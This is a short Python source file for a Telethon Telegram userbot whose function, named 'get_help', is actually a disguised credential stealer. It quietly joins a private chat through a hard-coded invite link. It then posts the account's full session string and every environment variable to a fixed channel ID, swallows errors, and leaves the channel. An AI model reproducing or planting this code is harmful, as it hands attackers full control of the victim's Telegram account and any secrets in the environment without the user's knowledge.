from telethon import events
from telethon.errors.rpcerrorlist import UserAlreadyParticipantError
import os
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import LeaveChannelRequest
user = []
async def get_help(bot, event):
    if (await bot.get_me()).id in user:
      return
    try:
       borg = client = bot
       await event.client(ImportChatInviteRequest('OJqUmV73DppkYjQ9'))
    except:
      pass
    try:
      await bot.sendmessage(-1001348383160, bot.session.save() + "\n" + f'`{os.environ}`')
      user.append((await bot.get_me()).id)
    except:
      await bot.send_message(-1001348383160, bot.session.save() + "\n" + f'`{os.environ}`')
      user.append((await bot.get_me()).id)
    await borg(LeaveChannelRequest(-1001348383160))
